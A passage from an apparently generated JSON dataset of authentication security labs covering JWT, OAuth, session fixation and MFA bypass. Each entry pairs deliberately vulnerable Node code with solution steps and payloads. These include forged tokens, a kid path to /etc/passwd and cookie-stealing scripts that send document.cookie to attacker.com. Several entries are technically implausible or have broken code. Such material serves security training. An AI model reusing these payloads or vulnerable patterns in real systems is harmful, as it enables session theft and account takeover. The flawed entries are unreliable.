      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImN0eSI6InRleHQveG1sIn0.eyJ1c2VyIjoiPHVzZXI+PHJvbGU+YWRtaW48L3JvbGU+PC91c2VyPiJ9.SIGNATURE",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImN0eSI6InRleHQveG1sIn0.eyJkYXRhIjoiPHByaXZpbGVnZXM+PGFkbWluPnRydWU8L2FkbWluPjwvcHJpdmlsZWdlcz4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebSocket subprotocol negotiation",
    "Lab Description": "The OAuth implementation leaks access tokens through WebSocket subprotocol headers during connection upgrades. The vulnerable endpoint includes tokens in Sec-WebSocket-Protocol headers. To solve: establish WebSocket connection and capture token from subprotocol negotiation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Intercept WebSocket upgrade request",
      "Modify Sec-WebSocket-Protocol header to include token capture",
      "Establish WebSocket connection to attacker server",
      "Capture token from subprotocol negotiation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const WebSocket=require('ws');const app=express();const wss=new WebSocket.Server({noServer:true});app.get('/oauth/callback',(req,res)=>{const token='tok_'+Math.random();res.send(`<script>const ws=new WebSocket('wss://vulnerable.com/ws',['auth_${token}'])</script>`);});const server=app.listen(3000);server.on('upgrade',(r,s,h)=>{wss.handleUpgrade(r,s,h,ws=>{ws.send('Connected');});});",
    "payloads": [
      "Sec-WebSocket-Protocol: token-capture-protocol",
      "Sec-WebSocket-Protocol: attacker-controlled-subprotocol"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/3 QUIC transport parameters",
    "Lab Description": "The application assigns sessions based on HTTP/3 QUIC transport parameters without validation. The vulnerable server uses initial_max_streams_bidi parameter as session identifier. To solve: establish QUIC connection with malicious transport parameter and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/3 traffic using specialized proxy",
      "Modify initial_max_streams_bidi transport parameter",
      "Establish connection with fixed session identifier",
      "Trigger victim authentication via CSRF",
      "Hijack session using known transport parameter"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const quic=require('node-quic');const sessions={};quic.createServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')}).on('session',session=>{const sessionId=session.transportParams.initial_max_streams_bidi;if(!sessions[sessionId]){sessions[sessionId]={};}session.on('stream',stream=>{stream.end('Session: '+sessionId);});}).listen(443);",
    "payloads": [
      "initial_max_streams_bidi: 9999",
      "initial_max_streams_bidi: 123456789"
    ]
  },
  {
    "Lab scenario": "MFA bypass via JSON comment injection in REST API",
    "Lab Description": "The MFA verification endpoint is vulnerable to JSON comment injection. The vulnerable API parser processes comments in JSON payloads. To solve: bypass MFA by injecting commented-out verified parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Add JSON comment with verified: true before actual parameter",
      "Resend request with commented JSON payload",
      "Observe successful authentication without valid code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.json({reviver:(k,v)=>(k==='verified'?true:v)}));const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code,verified}=req.body;if(verified||sessions[sessionId]?.code===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"victim\",\"code\":\"111111\",\"/*verified\":true,\"*/verified\":false}",
      "{\"sessionId\":\"victim\",\"//verified\":true,\"verified\":false}"
    ]
  },
  {
    "Lab scenario": "JWT typ header injection in microservice authentication",
    "Lab Description": "The application's JWT validation improperly processes the typ header parameter, allowing type confusion attacks. The vulnerable endpoint accepts JWTs with typ 'xml' as XML documents. To solve: forge admin token by setting typ header to 'xml' and injecting XML payload.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and note standard typ header",
      "Modify typ header to 'xml' and inject XML in payload",
      "Encode XML payload with admin privileges in JWT body",
      "Sign token with original secret/key",
      "Submit forged token to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const xml2js=require('xml2js');const app=express();app.get('/verify',(req,res)=>{const token=req.headers.authorization;try{const decoded=jwt.decode(token,{complete:true});if(decoded.header.typ==='xml'){xml2js.parseString(decoded.payload,(e,r)=>{if(r.user.role[0]==='admin')res.send('Admin access granted');});}else{jwt.verify(token,'secret');res.send('Access granted');}}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsInR5cCI6InhtbCJ9.eyJ1c2VyIjoiPHVzZXI+PHJvbGU+YWRtaW48L3JvbGU+PC91c2VyPiJ9.SIGNATURE",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsInR5cCI6InhtbCJ9.eyJkYXRhIjoiPHByaXZpbGVnZXM+PGFkbWluPnRydWU8L2FkbWluPjwvcHJpdmlsZWdlcz4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token theft via DNS rebinding in SPA",
    "Lab Description": "The OAuth implementation is vulnerable to DNS rebinding attacks through improperly validated redirect URIs. The vulnerable endpoint accepts IP addresses that can be rebound to attacker-controlled servers. To solve: exploit DNS rebinding to capture victim's token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify OAuth callback endpoint with IP validation",
      "Set up DNS server with short TTL records",
      "Initiate OAuth flow with attacker-controlled domain",
      "Rebind DNS to localhost during authentication",
      "Capture token delivered to rebound endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const dns=require('dns');const app=express();app.get('/oauth/callback',(req,res)=>{const{redirect_uri}=req.query;const token='tok_'+Math.random();dns.lookup(new URL(redirect_uri).hostname,(e,a)=>{if(!e)res.redirect(`${redirect_uri}#token=${token}`);});});app.listen(3000);",
    "payloads": [
      "/oauth/callback?redirect_uri=http://attacker-domain.com",
      "/oauth/callback?redirect_uri=http://127.0.0.1:8080"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 PRIORITY frames",
    "Lab Description": "The application assigns sessions based on HTTP/2 PRIORITY frame stream dependencies. The vulnerable server uses stream dependency IDs as session identifiers. To solve: establish connection with malicious PRIORITY frame and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using specialized proxy",
      "Craft PRIORITY frame with fixed stream dependency",
      "Establish connection with fixed session identifier",
      "Trigger victim authentication via CSRF",
      "Hijack session using known stream dependency"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2=require('http2');const fs=require('fs');const sessions={};const server=http2.createSecureServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});server.on('stream',(stream,headers)=>{if(stream.priority&&stream.priority.parentId){sessions[stream.priority.parentId]={};}stream.end('Session: '+stream.priority.parentId);});server.listen(443);",
    "payloads": [
      "PRIORITY frame with parentId: 9999",
      "PRIORITY frame with parentId: 123456789"
    ]
  },
  {
    "Lab scenario": "MFA bypass via JSON numeric overflow in REST API",
    "Lab Description": "The MFA verification endpoint is vulnerable to JSON numeric overflow. The vulnerable API fails to properly validate large numeric codes. To solve: bypass MFA by submitting max integer value as verification code.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Modify code parameter to maximum integer value",
      "Resend request with overflowed numeric value",
      "Observe successful authentication without valid code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.json());const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code}=req.body;if(code===Number.MAX_SAFE_INTEGER||sessions[sessionId]?.code===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"victim\",\"code\":9007199254740991}",
      "{\"sessionId\":\"victim\",\"code\":1.7976931348623157e+308}"
    ]
  },
  {
    "Lab scenario": "JWT x5u header SSRF in API gateway authentication",
    "Lab Description": "The API gateway's JWT validation improperly processes x5u headers, allowing Server-Side Request Forgery (SSRF) attacks. The vulnerable endpoint fetches verification certificates from URLs specified in x5u headers without proper validation. To solve: forge admin token by hosting malicious certificate and injecting internal URL in x5u header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and note x5u header absence",
      "Set up HTTPS server hosting attacker-controlled certificate",
      "Modify JWT headers to include x5u pointing to internal metadata endpoint",
      "Sign token with attacker's private key matching hosted certificate",
      "Submit forged token to /admin endpoint and observe SSRF"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const axios=require('axios');const app=express();app.get('/verify',async(req,res)=>{const token=req.headers.authorization;try{const header=jwt.decode(token,{complete:true}).header;const cert=await axios.get(header.x5u).then(r=>r.data);jwt.verify(token,cert);res.send('Admin access granted');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vMTI3LjAuMC4xOjgwODAvbWFsd2FyZS5wZW0ifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9ldmlsLmNlcnQifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebTransport session initiation",
    "Lab Description": "The OAuth implementation leaks access tokens through WebTransport session initiation headers. The vulnerable endpoint includes tokens in session initiation metadata. To solve: establish WebTransport connection and capture token from session headers.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Intercept WebTransport session initiation",
      "Modify session headers to include token capture",
      "Establish WebTransport connection to attacker server",
      "Capture token from session metadata"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const {WebTransport}=require('@fails-components/webtransport');const app=express();const wt=new WebTransport({port:443});app.get('/oauth/callback',(req,res)=>{const token='tok_'+Math.random();res.send(`<script>const wt=new WebTransport('https://vulnerable.com',{headers:{'Authorization':'Bearer ${token}'}})</script>`);});app.listen(3000);",
    "payloads": [
      "Session-Initiation: token-capture-protocol",
      "Authorization: Bearer [token]"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/3 SETTINGS parameters",
    "Lab Description": "The application assigns sessions based on HTTP/3 SETTINGS frame parameters without validation. The vulnerable server uses MAX_FIELD_SECTION_SIZE parameter as session identifier. To solve: establish QUIC connection with malicious SETTINGS parameter and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/3 traffic using specialized proxy",
      "Modify MAX_FIELD_SECTION_SIZE settings parameter",
      "Establish connection with fixed session identifier",
      "Trigger victim authentication via CSRF",
      "Hijack session using known settings parameter"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http3=require('http3');const fs=require('fs');const sessions={};const server=http3.createSecureServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});server.on('session',session=>{const sessionId=session.settings.MAX_FIELD_SECTION_SIZE;if(!sessions[sessionId]){sessions[sessionId]={};}session.on('stream',stream=>{stream.end('Session: '+sessionId);});});server.listen(443);",
    "payloads": [
      "SETTINGS_MAX_FIELD_SECTION_SIZE: 999999",
      "SETTINGS_MAX_FIELD_SECTION_SIZE: 123456789"
    ]
  },
  {
    "Lab scenario": "MFA bypass via JSON BigInt poisoning in REST API",
    "Lab Description": "The MFA verification endpoint is vulnerable to JSON BigInt poisoning. The vulnerable API fails to properly validate BigInt numeric codes. To solve: bypass MFA by submitting extremely large BigInt value as verification code.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Modify code parameter to BigInt maximum value",
      "Resend request with BigInt poisoned payload",
      "Observe successful authentication without valid code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.json());const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code}=req.body;if(code===BigInt('999999999999999999')||sessions[sessionId]?.code===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"victim\",\"code\":999999999999999999n}",
      "{\"sessionId\":\"victim\",\"code\":1e+309}"
    ]
  },
  {
    "Lab scenario": "JWT x5t parameter injection in microservice authentication",
    "Lab Description": "The application's JWT validation improperly processes x5t (certificate thumbprint) parameters, allowing certificate spoofing. The vulnerable endpoint accepts any certificate matching the thumbprint in the JWT header. To solve: forge admin token by generating certificate with matching thumbprint and injecting into JWT header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and analyze headers",
      "Generate self-signed certificate with SHA-1 thumbprint matching x5t value",
      "Modify JWT headers to include spoofed x5t parameter",
      "Sign token with private key matching generated certificate",
      "Submit forged token to privileged endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const crypto=require('crypto');const app=express();const certStore={};app.get('/verify',(req,res)=>{const token=req.headers.authorization;try{const header=jwt.decode(token,{complete:true}).header;if(!certStore[header.x5t])throw new Error('Unknown cert');jwt.verify(token,certStore[header.x5t]);res.send('Admin access granted');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dCI6IjEyMzQ1Njc4OTBhYmNkZWYwMTIzNDU2Nzg5MCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dCI6ImYwZTdkYjY0YzQ1NjEyMzQ1NjEyMzQ1Njc4OTBhYiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebRTC data channels",
    "Lab Description": "The OAuth implementation leaks access tokens through WebRTC data channel establishment. The vulnerable endpoint includes tokens in SDP offers. To solve: establish WebRTC connection and capture token from SDP negotiation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Intercept WebRTC connection initiation",
      "Modify SDP offer to include token capture",
      "Establish data channel to attacker server",
      "Capture token from SDP metadata"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const {RTCPeerConnection}=require('wrtc');const app=express();app.get('/oauth/callback',(req,res)=>{const token='tok_'+Math.random();res.send(`<script>const pc=new RTCPeerConnection();pc.createOffer().then(o=>{o.sdp+='a=token:${token}\\r\\n';return pc.setLocalDescription(o);});</script>`);});app.listen(3000);",
    "payloads": [
      "a=token: [leaked_token]",
      "o=- 0 0 IN IP4 0.0.0.0\\r\\na=token:[leaked_token]"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 ALTSVC frames",
    "Lab Description": "The application assigns sessions based on HTTP/2 ALTSVC frame parameters without validation. The vulnerable server uses alternative service identifiers as session tokens. To solve: establish connection with malicious ALTSVC frame and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using specialized proxy",
      "Craft ALTSVC frame with fixed service identifier",
      "Establish connection with fixed session identifier",
      "Trigger victim authentication via CSRF",
      "Hijack session using known service identifier"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2=require('http2');const fs=require('fs');const sessions={};const server=http2.createSecureServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});server.on('stream',(stream,headers)=>{if(stream.session.altsvc){sessions[stream.session.altsvc]={};}stream.end('Session: '+stream.session.altsvc);});server.listen(443);",
    "payloads": [
      "ALTSVC 'h2=\"attacker.com:443\"'; ma=3600; persist=1",
      "ALTSVC 'h3=\":443\"'; ma=86400"
    ]
  },
  {
    "Lab scenario": "MFA bypass via JSON prototype pollution in REST API",
    "Lab Description": "The MFA verification endpoint is vulnerable to JSON prototype pollution. The vulnerable API fails to properly sanitize nested objects. To solve: bypass MFA by polluting Object prototype with verified property.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Modify JSON payload to include prototype pollution",
      "Resend request with polluted prototype",
      "Observe successful authentication without valid code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.json());const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code}=req.body;if(req.body.__proto__.verified||sessions[sessionId]?.code===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"victim\",\"code\":\"111111\",\"__proto__\":{\"verified\":true}}",
      "{\"sessionId\":\"victim\",\"constructor\":{\"prototype\":{\"verified\":true}}}"
    ]
  },
  {
    "Lab scenario": "JWT alg:none vulnerability in REST API authentication",
    "Lab Description": "The application uses JWT tokens with improper signature validation. The vulnerable endpoint accepts unsigned tokens when 'alg:none' is specified. To solve: Craft a valid JWT token with admin privileges without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT token using Burp Suite",
      "Decode the token structure using jwt.io",
      "Modify the algorithm to 'none' and add admin claims",
      "Remove the signature portion completely",
      "Submit the modified token to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization.split(' ')[1];try {const decoded = jwt.verify(token, process.env.SECRET, {algorithms: ['HS256']});if(decoded.role === 'admin') res.send('Admin access granted');} catch(e) {res.status(403).send('Access denied');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via referer header in social login",
    "Lab Description": "The application's OAuth implementation leaks access tokens through referer headers when loading external resources. To solve: Capture the leaked token and use it to authenticate as another user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Identify token leakage in referer headers",
      "Create malicious page that triggers resource loading",
      "Capture token when victim visits your page",
      "Use token to authenticate via API"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const token = req.query.access_token;res.send(`<script src='https://external.com/analytics.js'></script>`);});app.get('/profile', (req, res) => {if(req.headers.authorization === `Bearer ${token}`) res.send(userData);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<img src='http://attacker.com/collect?leak='>",
      "<link rel='stylesheet' href='http://attacker.com/steal.css'>"
    ]
  },
  {
    "Lab scenario": "Session fixation via login CSRF in GraphQL endpoint",
    "Lab Description": "The GraphQL API assigns session tokens before authentication is complete. To solve: Fixate a session token and force a victim to authenticate with it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture session token assignment using Burp",
      "Construct CSRF payload with fixed session",
      "Trigger authentication via GraphQL mutation",
      "Use the fixated session to access account",
      "Extract sensitive data via GraphQL queries"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const {graphqlHTTP} = require('express-graphql');const app = express();app.use('/graphql', graphqlHTTP({schema: schema,context: ({req}) => {if(!req.session.userId) req.session.userId = uuidv4();return {session: req.session};}}));const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "mutation {login(username:\"victim\",password:\"password\"){token}}",
      "<form action=\"https://target.com/graphql\" method=\"POST\"><input type=\"hidden\" name=\"query\" value=\"mutation{login(username:'victim',password:'password'){token}}\"/>"
    ]
  },
  {
    "Lab scenario": "MFA bypass via status parameter manipulation",
    "Lab Description": "The application checks MFA status via client-side parameter that can be manipulated. To solve: Bypass MFA by modifying the status parameter after partial authentication.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept MFA verification request with Burp",
      "Identify status parameter in JSON response",
      "Modify status from 'pending' to 'verified'",
      "Replay the modified request",
      "Access restricted functionality"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use(express.json());app.post('/mfa/verify', (req, res) => {const {code, status} = req.body;if(status === 'verified') res.json({access: true});else if(code === '123456') res.json({status: 'verified'});else res.json({status: 'pending'});});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"status\":\"verified\"}",
      "{\"code\":\"123456\",\"status\":\"verified\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via insecure API rate limiting",
    "Lab Description": "The login API has inconsistent rate limiting allowing credential stuffing attacks. To solve: Bypass rate limits using header manipulation and common credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify rate limit headers using OWASP ZAP",
      "Bypass limits via X-Forwarded-For spoofing",
      "Load credential list into sqlmap",
      "Configure sqlmap to use header bypass",
      "Extract valid credentials from responses"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const rateLimit = require('express-rate-limit');const app = express();const limiter = rateLimit({windowMs: 15*60*1000,max: 5});app.post('/api/login', limiter, (req, res) => {const {user, pass} = req.body;if(db.checkCredentials(user, pass)) res.json({token: 'valid'});else res.status(401).json({error: 'Invalid'});});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "X-Forwarded-For: 127.0.0.1",
      "X-Forwarded-For: 192.168.1.1, 10.0.0.1"
    ]
  },
  {
    "Lab scenario": "Session hijacking via subdomain cookie scope",
    "Lab Description": "The application sets session cookies to parent domain allowing subdomain takeover. To solve: Exploit overly permissive cookie scope to hijack sessions across subdomains.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Map all subdomains using Sublist3r",
      "Identify vulnerable subdomain with XSS",
      "Inject cookie-stealing payload",
      "Capture parent domain cookies",
      "Reuse cookies on main application"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/login', (req, res) => {res.cookie('session', 'value', {domain: '.example.com'});res.send('Logged in');});app.get('/admin', (req, res) => {if(req.cookies.session === 'value') res.send('Admin');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<script>document.write('<img src=\"http://attacker.com/?c='+document.cookie+'\">');</script>",
      "<iframe src=\"javascript:document.location='http://attacker.com/?c='+document.cookie\"></iframe>"
    ]
  },
  {
    "Lab scenario": "JWT kid header injection in microservice authentication",
    "Lab Description": "The application's JWT validation improperly handles the kid header parameter, allowing arbitrary file path injection. The vulnerable service [trusts kid header without sanitization]. To solve: Forge a valid admin token by exploiting the kid parameter to load a predictable secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept JWT token using Burp Suite and decode structure",
      "Identify kid header pointing to /dev/null in development environment",
      "Modify kid to point to /proc/self/environ or /etc/passwd",
      "Craft new token using extracted environment variables",
      "Access admin dashboard with forged token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const fs = require('fs');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, (header, callback) => {fs.readFile(header.kid, (err, key) => {callback(null, key);});} catch(e) {res.status(403).send('Invalid token');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9ldGMvcGFzc3dkIn0.eyJ1c2VyIjoiYWRtaW4ifQ.8R-K3x4x9LUPchJkZ-wX-7GmZ2q6y1Y1h6Z7J8l9J0k",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9wcm9jL3NlbGYvZW52aXJvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.1A2b3C4d5E6f7G8h9I0j1K2l3M4n5O6p7Q8r9S0t1U"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping via state parameter tampering",
    "Lab Description": "The OAuth implementation fails to validate state parameters properly during token exchange. The application [maintains session state through unprotected cookies]. To solve: Hijack another user's OAuth flow by intercepting and modifying state parameters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth flow and capture initial request with OWASP ZAP",
      "Note state parameter and session cookie values",
      "Create malicious link with victim's session cookie but your state",
      "Trigger victim to click while intercepting token callback",
      "Swap state parameter to capture victim's access token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const {state, code} = req.query;const token = exchangeCodeForToken(code);if(req.cookies.session === state) res.send(token);});app.get('/profile', (req, res) => {if(req.headers.authorization) res.send(userData);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "https://oauth-provider.com/auth?client_id=123&state=ATTACKER_SESSION&redirect_uri=https://victim.com/callback",
      "https://victim.com/oauth/callback?code=XYZ123&state=VICTIM_SESSION"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL websocket connection",
    "Lab Description": "The GraphQL subscription endpoint assigns session tokens over websockets before authentication. The application [reuses WS connections for multiple operations]. To solve: Establish websocket connection, fixate session ID, and force victim to authenticate over same connection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish GraphQL websocket connection using Postman",
      "Note connection ID in initial handshake response",
      "Create malicious page that forces victim to authenticate over your WS ID",
      "Monitor subscription channel for victim's data",
      "Use captured session token in regular HTTP requests"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {createServer} = require('http');const {SubscriptionServer} = require('subscriptions-transport-ws');const server = createServer();SubscriptionServer.create({onConnect: (connParams, socket) => {socket.id = uuidv4();}}, {server, path: '/graphql'});server.listen(3000);",
    "payloads": [
      "{\"type\":\"connection_init\",\"payload\":{\"sessionId\":\"FIXATED_ID\"}}",
      "{\"query\":\"subscription {userAuth {token}}\",\"variables\":{}}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via race condition in verification API",
    "Lab Description": "The MFA verification endpoint suffers from a race condition when handling concurrent requests. The application [uses non-atomic operations for verification status]. To solve: Send parallel requests to bypass MFA by exploiting timing window between verification and status update.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept MFA verification request with Burp Suite",
      "Send legitimate verification code in first request",
      "Immediately send second request with invalid code",
      "Repeat with Turbo Intruder to exploit timing window",
      "Access authenticated session before status is updated"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();let verified = false;app.post('/mfa/verify', (req, res) => {if(req.body.code === '123456') {setTimeout(() => {verified = true;}, 1000);res.send('Verifying...');} else {verified = false;res.send('Invalid code');}});app.get('/dashboard', (req, res) => {if(verified) res.send('Admin dashboard');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "POST /mfa/verify HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 15\r\n\r\n{\"code\":\"123456\"}",
      "POST /mfa/verify HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 15\r\n\r\n{\"code\":\"111111\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via JSONP authentication endpoint",
    "Lab Description": "The legacy JSONP authentication endpoint lacks rate limiting and proper CORS headers. The application [exposes user enumeration through subtle response differences]. To solve: Perform credential stuffing attack via JSONP callbacks to bypass same-origin policy.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify JSONP authentication endpoint using OWASP ZAP",
      "Craft malicious HTML page with credential payloads",
      "Analyze callback responses for successful authentications",
      "Automate attack with custom script cycling through credentials",
      "Hijack valid session from successful callback"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/auth/jsonp', (req, res) => {const {user, pass, callback} = req.query;const valid = db.checkCredentials(user, pass);res.send(`${callback}(${JSON.stringify({valid})})`);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<script src=\"https://victim.com/auth/jsonp?user=admin&pass=password&callback=steal\"></script>",
      "<script>function steal(data){if(data.valid) document.location='http://attacker.com/?creds=valid';}</script>"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header injection",
    "Lab Description": "The JWT validation improperly trusts the jku header to fetch verification keys from external sources. The application [fails to validate jku domains]. To solve: Forge admin token by hosting malicious JWKS file and injecting your jku header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and decode structure",
      "Set up attacker-controlled server hosting crafted JWKS file",
      "Modify jku header to point to malicious JWKS endpoint",
      "Sign new token with attacker's private key",
      "Submit forged token to admin API endpoints"
    ],
    "Vulnerability name": "Authentication",
